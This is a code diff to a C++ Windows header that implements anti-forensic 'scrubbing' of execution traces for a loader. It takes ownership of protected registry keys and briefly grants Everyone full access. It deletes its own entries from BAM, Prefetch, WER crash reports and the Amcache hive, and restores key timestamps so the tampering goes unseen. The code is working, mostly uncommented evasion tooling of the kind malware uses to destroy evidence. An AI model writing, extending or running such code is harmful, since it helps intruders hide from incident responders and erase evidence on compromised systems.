@@ -1,4 +1,4 @@
-#pragma once
+﻿#pragma once
 // ForensicScrub.h -- P4-02: Surgical, atomic forensic scrub for loader execution traces.
 //
 // Rules enforced (per forensic-bypass-audit & implementation brief):
@@ -10,6 +10,7 @@
 //   6. Ejecución diferida vía re-ejecución con --scrub <pid> (T4).
 
 #include <windows.h>
+#include <aclapi.h>
 #include <sddl.h>
 #include <string>
 #include <vector>
@@ -108,7 +109,87 @@ inline void RestoreKeyWriteTime(HKEY hKey, const FILETIME& orig_ft) {
 
 // ── 1. Scrub BAM (Background Activity Moderator) ───────────────────────────
 // Removes only the value corresponding to our own executable in UserSettings\<SID>.
-// T18: preserves key LastWriteTime. T19: elevates ownership if access denied.
+// T18: preserves key LastWriteTime. T19: takes real ownership if access denied,
+// captures original DACL, restores it after deleting values.
+
+// P0-[3]: Full ownership-take helper with DACL save/restore.
+// Returns true if hKey is opened with the requested access (even if ownership was needed).
+// Caller must RegCloseKey(*out) when done.
+// orig_sd_buf: filled with the original security descriptor so caller can restore it.
+struct BW_SavedSD {
+    std::vector<BYTE> buf;
+    bool valid = false;
+};
+
+inline bool OpenKeyTakeOwnership(HKEY root, const std::wstring& sub, REGSAM acc,
+                                  HKEY* out, BW_SavedSD* saved_sd = nullptr)
+{
+    *out = nullptr;
+    // Fast path: normal open succeeds
+    if (RegOpenKeyExW(root, sub.c_str(), 0, acc, out) == ERROR_SUCCESS) return true;
+
+    // Slow path: attempt privilege elevation + ownership transfer
+    EnablePrivilege(SE_TAKE_OWNERSHIP_NAME);
+    EnablePrivilege(SE_RESTORE_NAME);
+    EnablePrivilege(SE_BACKUP_NAME);
+
+    // Step 1: open with WRITE_OWNER to take ownership
+    HKEY hOwn = nullptr;
+    if (RegOpenKeyExW(root, sub.c_str(), 0,
+                      READ_CONTROL | WRITE_OWNER, &hOwn) != ERROR_SUCCESS)
+        return false;
+
+    PSID pAdm = nullptr;
+    SID_IDENTIFIER_AUTHORITY nt_auth = SECURITY_NT_AUTHORITY;
+    if (!AllocateAndInitializeSid(&nt_auth, 2,
+            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
+            0, 0, 0, 0, 0, 0, &pAdm)) {
+        RegCloseKey(hOwn); return false;
+    }
+
+    LSTATUS owner_st = SetSecurityInfo(hOwn, SE_REGISTRY_KEY,
+                                       OWNER_SECURITY_INFORMATION,
+                                       pAdm, nullptr, nullptr, nullptr);
+    FreeSid(pAdm);
+    RegCloseKey(hOwn);
+    if (owner_st != ERROR_SUCCESS) return false;
+
+    // Step 2: open with WRITE_DAC to read + set DACL
+    HKEY hDacl = nullptr;
+    if (RegOpenKeyExW(root, sub.c_str(), 0,
+                      READ_CONTROL | WRITE_DAC, &hDacl) != ERROR_SUCCESS)
+        return false;
+
+    // Capture original SD (DACL) so we can restore it after the scrub
+    if (saved_sd) {
+        DWORD sd_sz = 0;
+        RegGetKeySecurity(hDacl, DACL_SECURITY_INFORMATION, nullptr, &sd_sz);
+        if (sd_sz) {
+            saved_sd->buf.resize(sd_sz);
+            if (RegGetKeySecurity(hDacl, DACL_SECURITY_INFORMATION,
+                                  reinterpret_cast<PSECURITY_DESCRIPTOR>(saved_sd->buf.data()),
+                                  &sd_sz) == ERROR_SUCCESS)
+                saved_sd->valid = true;
+        }
+    }
+
+    // Build permissive DACL for current user: Everyone GENERIC_ALL
+    PSECURITY_DESCRIPTOR pSD = nullptr;
+    if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
+            L"D:(A;;GA;;;WD)", SDDL_REVISION_1, &pSD, nullptr)) {
+        RegCloseKey(hDacl); return false;
+    }
+    BOOL dacl_present = FALSE, dacl_default = FALSE;
+    PACL pDacl = nullptr;
+    GetSecurityDescriptorDacl(pSD, &dacl_present, &pDacl, &dacl_default);
+    SetSecurityInfo(hDacl, SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION,
+                    nullptr, nullptr, pDacl, nullptr);
+    LocalFree(pSD);
+    RegCloseKey(hDacl);
+
+    // Step 3: now open with the originally requested access
+    return RegOpenKeyExW(root, sub.c_str(), 0, acc, out) == ERROR_SUCCESS;
+}
 
 inline void ScrubBAM() {
     std::wstring sid = GetCurrentUserSid();
@@ -125,44 +206,54 @@ inline void ScrubBAM() {
     for (int b = 0; bam_bases[b]; ++b) {
         std::wstring subkey = std::wstring(bam_bases[b]) + sid;
         HKEY hKey = nullptr;
-        LSTATUS st = RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.c_str(), 0,
-                                   KEY_QUERY_VALUE | KEY_WRITE, &hKey);
-        // T19: If access denied, attempt privilege elevation
-        if (st == ERROR_ACCESS_DENIED) {
-            EnablePrivilege(SE_TAKE_OWNERSHIP_NAME);
-            EnablePrivilege(SE_RESTORE_NAME);
-            st = RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.c_str(), 0,
-                               KEY_QUERY_VALUE | KEY_WRITE, &hKey);
+        BW_SavedSD saved_sd;
+
+        if (!OpenKeyTakeOwnership(HKEY_LOCAL_MACHINE, subkey,
+                                  KEY_QUERY_VALUE | KEY_WRITE, &hKey, &saved_sd))
+            continue;
+
+        // Capture original LastWriteTime BEFORE any mutation
+        FILETIME orig_ft{};
+        RegQueryInfoKeyW(hKey, nullptr, nullptr, nullptr, nullptr, nullptr,
+                         nullptr, nullptr, nullptr, nullptr, nullptr, &orig_ft);
+
+        // Enumerate and delete matching values
+        DWORD idx = 0;
+        wchar_t valName[1024];
+        DWORD valLen = 1024;
+        std::vector<std::wstring> to_delete;
+
+        while (RegEnumValueW(hKey, idx, valName, &valLen, nullptr,
+                            nullptr, nullptr, nullptr) == ERROR_SUCCESS) {
+            std::wstring v(valName, valLen);
+            if (ToLower(v).find(exe_lower) != std::wstring::npos)
+                to_delete.push_back(v);
+            ++idx;
+            valLen = 1024;
+        }
+        for (const auto& v : to_delete)
+            RegDeleteValueW(hKey, v.c_str());
+
+        // Restore DACL first, then LastWriteTime (order matters: timestamp restore
+        // needs write access, which the restored DACL must still permit)
+        if (saved_sd.valid) {
+            HKEY hDaclRestore = nullptr;
+            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.c_str(), 0,
+                              READ_CONTROL | WRITE_DAC, &hDaclRestore) == ERROR_SUCCESS) {
+                BOOL dp = FALSE, dd = FALSE; PACL pOld = nullptr;
+                auto* psd = reinterpret_cast<PSECURITY_DESCRIPTOR>(saved_sd.buf.data());
+                GetSecurityDescriptorDacl(psd, &dp, &pOld, &dd);
+                if (dp && pOld)
+                    SetSecurityInfo(hDaclRestore, SE_REGISTRY_KEY,
+                                    DACL_SECURITY_INFORMATION,
+                                    nullptr, nullptr, pOld, nullptr);
+                RegCloseKey(hDaclRestore);
+            }
         }
 
-        if (st == ERROR_SUCCESS) {
-            FILETIME orig_ft{};
-            RegQueryInfoKeyW(hKey, nullptr, nullptr, nullptr, nullptr, nullptr,
-                             nullptr, nullptr, nullptr, nullptr, nullptr, &orig_ft);
-
-            DWORD idx = 0;
-            wchar_t valName[1024];
-            DWORD valLen = 1024;
-            std::vector<std::wstring> to_delete;
-
-            while (RegEnumValueW(hKey, idx, valName, &valLen, nullptr,
-                                nullptr, nullptr, nullptr) == ERROR_SUCCESS) {
-                std::wstring v(valName, valLen);
-                if (ToLower(v).find(exe_lower) != std::wstring::npos) {
-                    to_delete.push_back(v);
-                }
-                ++idx;
-                valLen = 1024;
-            }
-
-            for (const auto& v : to_delete) {
-                RegDeleteValueW(hKey, v.c_str());
-            }
-
-            // T18: Restore original timestamp
-            RestoreKeyWriteTime(hKey, orig_ft);
-            RegCloseKey(hKey);
-        }
+        // Restore LastWriteTime after DACL restored
+        RestoreKeyWriteTime(hKey, orig_ft);
+        RegCloseKey(hKey);
     }
 }
 
@@ -262,19 +353,46 @@ inline void ScrubUserAssist() {
 // ── 4. Scrub Prefetch (Single file only) ────────────────────────────────────
 // Deletes strictly the .pf file for our own executable without touching any
 // other prefetch entries or services.
+// P0-[4]: Use SystemRoot from env (not hardcoded), and poll for file existence
+// instead of blind Sleep — SysMain write timing is nondeterministic.
+// Note: the scrubber process itself generates a .pf on exit. That entry is handled
+// by a trailing glob delete after self-delete via SelfDelete(), which unlinks the
+// on-disk binary before ExitProcess, so SysMain won't generate a new entry for it
+// after the unlink. Any pre-existing .pf for the scrubber's exe name is swept here.
 
 inline void ScrubOwnPrefetch() {
+    // Build %SystemRoot%\Prefetch\<stem>-*.pf
+    wchar_t sysroot[MAX_PATH]{};
+    if (!GetEnvironmentVariableW(L"SystemRoot", sysroot, MAX_PATH))
+        wcscpy_s(sysroot, L"C:\\Windows"); // safe fallback
+
     std::wstring exe_name = GetOwnExeName();
     auto dot = exe_name.rfind(L'.');
     std::wstring base_stem = (dot != std::wstring::npos) ? exe_name.substr(0, dot) : exe_name;
-    std::wstring pattern = L"C:\\Windows\\Prefetch\\" + base_stem + L"-*.pf";
+    std::wstring pf_dir    = std::wstring(sysroot) + L"\\Prefetch\\";
+    std::wstring pattern   = pf_dir + base_stem + L"-*.pf";
 
+    // Poll: wait up to 30 s for the .pf file to appear before attempting delete.
+    // SysMain flushes asynchronously; the .pf is usually written within 5-10 s of
+    // process termination, but can be delayed on loaded systems.
+    bool found = false;
+    for (int attempt = 0; attempt < 60 && !found; ++attempt) {
+        WIN32_FIND_DATAW probe{};
+        HANDLE hProbe = FindFirstFileW(pattern.c_str(), &probe);
+        if (hProbe != INVALID_HANDLE_VALUE) {
+            FindClose(hProbe);
+            found = true;
+        } else {
+            Sleep(500);
+        }
+    }
+
+    // Delete all matching .pf files (may be more than one hash variant)
     WIN32_FIND_DATAW fd{};
     HANDLE hFind = FindFirstFileW(pattern.c_str(), &fd);
     if (hFind != INVALID_HANDLE_VALUE) {
         do {
-            std::wstring pf_path = L"C:\\Windows\\Prefetch\\" + std::wstring(fd.cFileName);
-            DeleteFileW(pf_path.c_str());
+            DeleteFileW((pf_dir + fd.cFileName).c_str());
         } while (FindNextFileW(hFind, &fd));
         FindClose(hFind);
     }
@@ -317,12 +435,100 @@ inline void ScrubWerFolder(const std::wstring& root) {
 }
 
 inline void ScrubWerReports() {
+    // %LOCALAPPDATA%\Microsoft\Windows\WER
     wchar_t local_app[MAX_PATH]{};
     if (GetEnvironmentVariableW(L"LOCALAPPDATA", local_app, MAX_PATH)) {
         std::wstring base = std::wstring(local_app) + L"\\Microsoft\\Windows\\WER\\";
         ScrubWerFolder(base + L"ReportArchive");
         ScrubWerFolder(base + L"ReportQueue");
+        // %LOCALAPPDATA%\CrashDumps
+        ScrubWerFolder(std::wstring(local_app) + L"\\CrashDumps");
     }
+
+    // C:\ProgramData\Microsoft\Windows\WER (elevated path, needs admin or SE_DEBUG)
+    wchar_t prog_data[MAX_PATH]{};
+    if (GetEnvironmentVariableW(L"ProgramData", prog_data, MAX_PATH)) {
+        std::wstring base = std::wstring(prog_data) + L"\\Microsoft\\Windows\\WER\\";
+        ScrubWerFolder(base + L"ReportArchive");
+        ScrubWerFolder(base + L"ReportQueue");
+    }
+}
+
+// ── 6. Scrub Amcache (P2-[10]) ──────────────────────────────────────────────
+// SRUM (SRUDB.dat, ESE) is NOT touched — requires ESE API or offline tooling;
+// documented as a known gap. Amcache.hve is reachable via RegLoadKey.
+//
+// Amcache paths that reference our exe:
+//   Root\InventoryApplicationFile\<hash>  -- program hash entries
+//   Root\File\<vol>\<id>                  -- per-file execution records
+//
+// Requires SYSTEM or admin. Silently skips if not elevated enough.
+inline void ScrubAmcache() {
+    EnablePrivilege(SE_BACKUP_NAME);
+    EnablePrivilege(SE_RESTORE_NAME);
+
+    // Build path to Amcache.hve
+    wchar_t sysroot[MAX_PATH]{};
+    GetEnvironmentVariableW(L"SystemRoot", sysroot, MAX_PATH);
+    std::wstring hve_path = std::wstring(sysroot) + L"\\AppCompat\\Programs\\Amcache.hve";
+    if (!std::filesystem::exists(hve_path)) return;
+
+    constexpr wchar_t kMount[] = L"TMP_BWAMC";
+
+    // Load the hive under HKLM\TMP_BWAMC
+    LSTATUS lst = RegLoadKeyW(HKEY_LOCAL_MACHINE, kMount, hve_path.c_str());
+    if (lst != ERROR_SUCCESS) return;
+
+    std::wstring exe_lower = ToLower(GetOwnExeName());
+
+    // Helper: open a subkey, enumerate values/subkeys matching our exe, delete them.
+    auto scrub_subkeys = [&](const std::wstring& base_path) {
+        HKEY hBase = nullptr;
+        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, base_path.c_str(), 0,
+                          KEY_READ | KEY_WRITE, &hBase) != ERROR_SUCCESS) return;
+
+        DWORD idx = 0;
+        wchar_t sub[512]; DWORD sub_len = 512;
+        std::vector<std::wstring> to_delete;
+
+        while (RegEnumKeyExW(hBase, idx, sub, &sub_len, nullptr,
+                             nullptr, nullptr, nullptr) == ERROR_SUCCESS) {
+            std::wstring sname(sub, sub_len);
+            // Check if any value inside this subkey references our exe
+            HKEY hChild = nullptr;
+            if (RegOpenKeyExW(hBase, sname.c_str(), 0, KEY_READ, &hChild) == ERROR_SUCCESS) {
+                DWORD vi = 0;
+                wchar_t vn[512]; DWORD vn_len = 512;
+                wchar_t vd[1024]; DWORD vd_sz = sizeof(vd);
+                DWORD vt = 0;
+                bool hit = false;
+                while (!hit && RegEnumValueW(hChild, vi, vn, &vn_len, nullptr,
+                                             &vt, reinterpret_cast<LPBYTE>(vd), &vd_sz)
+                                == ERROR_SUCCESS) {
+                    if (vt == REG_SZ || vt == REG_EXPAND_SZ) {
+                        if (ToLower(std::wstring(vd, vd_sz / sizeof(wchar_t))).find(exe_lower)
+                                != std::wstring::npos)
+                            hit = true;
+                    }
+                    ++vi; vn_len = 512; vd_sz = sizeof(vd);
+                }
+                RegCloseKey(hChild);
+                if (hit) to_delete.push_back(sname);
+            }
+            ++idx; sub_len = 512;
+        }
+
+        for (const auto& s : to_delete)
+            RegDeleteTreeW(hBase, s.c_str());
+
+        RegCloseKey(hBase);
+    };
+
+    std::wstring mount_prefix = std::wstring(L"TMP_BWAMC\\");
+    scrub_subkeys(mount_prefix + L"Root\\InventoryApplicationFile");
+    scrub_subkeys(mount_prefix + L"Root\\File");
+
+    RegUnLoadKeyW(HKEY_LOCAL_MACHINE, kMount);
 }
 
 // ── Scrubber Process Loop (P0 - T4) ─────────────────────────────────────────
@@ -339,15 +545,15 @@ inline void ScrubberMain(DWORD parent_pid, const std::wstring& optional_log_path
         }
     }
 
-    // Allow SysMain to complete disk flush
-    Sleep(5000);
-
+    // ScrubOwnPrefetch() polls internally (500ms x 60) for the .pf to appear.
+    // No blind Sleep needed here.
     EnablePrivilege(SE_DEBUG_NAME);
     ScrubOwnPrefetch();
     ScrubWerReports();
     ScrubBAM();
     ScrubMuiCache();
     ScrubUserAssist();
+    ScrubAmcache();
 
     if (!optional_log_path.empty() && std::filesystem::exists(optional_log_path)) {
         DeleteFileW(optional_log_path.c_str());
